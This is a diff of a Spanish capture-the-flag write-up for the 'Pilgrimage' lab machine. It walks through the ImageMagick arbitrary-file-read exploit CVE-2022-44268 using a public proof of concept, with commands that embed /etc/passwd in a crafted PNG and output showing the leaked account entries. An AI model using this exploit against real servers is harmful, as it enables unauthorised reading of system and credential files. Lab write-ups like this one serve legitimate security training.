@@ -12,7 +12,7 @@ layout:
     visible: true
 ---
 
-# Pilgrimage
+# ✅ Pilgrimage
 
 
 
@@ -289,7 +289,7 @@ Para hacer una imagen maliciosa se puede usar este exploit:&#x20;
 
 {% embed url="https://github.com/voidz0r/CVE-2022-44268" %}
 
-### How to use
+### Fase de explotacion con la herramienta.
 
 Instalar
 
@@ -297,11 +297,11 @@ Instalar
 sudo pacman -S imagemagick
 ```
 
-#### Clone the project
+#### Clone el proyecto
 
 `git clone https://github.com/voidz0r/CVE-2022-44268`
 
-#### Run the project
+#### Correr el projecto agregando como objectivo a `/etc/passwd`
 
 `cargo run "/etc/passwd"`
 
@@ -309,7 +309,7 @@ El camino de explotación consiste en crear un archivo PNG malicioso con un frag
 
 <figure><img src="../../../.gitbook/assets/2023-12-05_23-08.png" alt=""><figcaption></figcaption></figure>
 
-#### ImageMagick analyze the resized image
+#### ImageMagick : Utilizar identify para que muestre el metadato del codigo
 
 `identify -verbose 656faa9fd2023.png`
 
@@ -351,3 +351,14 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
 ```
 
+Como resultado ,nos demuestra que la ejecucion funciono y dejo algunos datos importantes.
+
+```
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+```
+emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
+```
+
+El objectivo es hacer otra ejecucion mas ,pero a otros directorios para recaudar ma sinformacion.
